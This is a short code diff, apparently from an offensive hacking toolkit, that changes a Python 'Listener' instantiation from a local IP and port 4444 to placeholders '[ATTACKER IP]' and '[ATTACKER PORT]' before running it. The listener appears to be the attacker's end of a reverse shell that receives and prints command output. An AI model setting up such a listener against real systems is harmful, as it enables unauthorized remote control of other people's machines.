@@ -66,5 +66,5 @@ class Listener:
             print(command_result)
 
 
-cykitlistener = Listener("10.0.2.15", 4444)
+cykitlistener = Listener("[ATTACKER IP]", [ATTACKER PORT])
 cykitlistener.run()
